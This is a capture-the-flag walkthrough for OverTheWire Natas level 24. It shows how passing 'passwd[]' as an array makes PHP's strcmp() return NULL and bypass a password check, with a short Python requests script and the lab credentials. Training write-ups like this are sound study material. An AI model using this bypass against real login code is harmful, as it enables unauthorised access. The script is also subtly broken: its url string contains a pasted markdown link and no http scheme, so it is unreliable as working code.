# Natas 23 - Natas 24 
    Username  : natas24
    Password  : MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
    URL       : http://natas24.natas.labs.overthewire.org

# Solution 
Looking at the source code:
```
if(array_key_exists("passwd",$_REQUEST)){
    if(!strcmp($_REQUEST["passwd"],"<censored>")){
        echo "The credentials for the next level are:<br>";
        echo "<pre>Username: natas25 Password: <censored></pre>";
    }
}
```
The strcmp() function compares two strings. It returns 0 if they're equal. However, if we pass an array instead of a string, strcmp() returns NULL, and !NULL evaluates to true.

Python script:
```
import requests
url = "[natas24.natas.labs.overthewire.org](http://natas24.natas.labs.overthewire.org/)"
auth = ("natas24", "MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd")
# Pass passwd as an array
r = requests.get(url, auth=auth, params={"passwd[]": ""})
print(r.text)
```
Run the above script to obtain the password for nexr level

# Password
    ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
